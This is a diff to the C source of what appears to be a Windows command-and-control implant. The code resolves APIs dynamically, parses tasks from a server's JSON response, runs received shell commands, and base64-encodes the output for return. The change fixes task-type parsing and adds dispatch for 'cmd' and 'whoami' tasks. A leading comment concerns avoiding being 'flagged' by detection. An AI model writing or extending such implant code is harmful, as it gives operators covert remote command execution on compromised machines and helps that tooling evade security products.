@@ -1,4 +1,5 @@
 // TODO: Using custom implementations of functionalities such as trimming and parsing is not okay as they can easily be flagged
+// TODO: is readJsonTask still modifying json?
 
 #include "addresshunter.h"
 #include <winnt.h>
@@ -815,8 +816,8 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
     task = myEndTrim(task, ',');
     task = myTrim(task, '"');
     *taskType = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
-    *taskType= myEndTrim(*uuid, ',');
-    *taskType = myTrim(*uuid, '"');
+    *taskType= myEndTrim(*taskType, ',');
+    *taskType = myTrim(*taskType, '"');
     *uuid = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
     *uuid = myEndTrim(*uuid, ',');
     *uuid = myTrim(*uuid, '"');
@@ -984,8 +985,6 @@ void myMain()
 
         b64Task = readJsonTask(api, jsonResponse, &taskId, &taskType, &agentUuid);
 
-        ((PRINTF)api->printf)(taskType);
-
         if (b64Task == NULL)
         {
             ((SLEEP)api->Sleep)(3000);
@@ -1015,7 +1014,18 @@ void myMain()
                 NULL
         );
 
-        taskOutput = myTrimB(api, ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput), '\n');
+        if (my_strcmp(taskType, "cmd") == 0)
+        {
+            taskOutput = myTrimB(api, ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput), '\n');
+        }
+        else if (my_strcmp(taskType, "whoami") == 0)
+        {
+            ((PRINTF)api->printf)("test whoami");
+        }
+        else
+        {
+            ((PRINTF)api->printf)("hehehe");
+        }
 
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
         b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
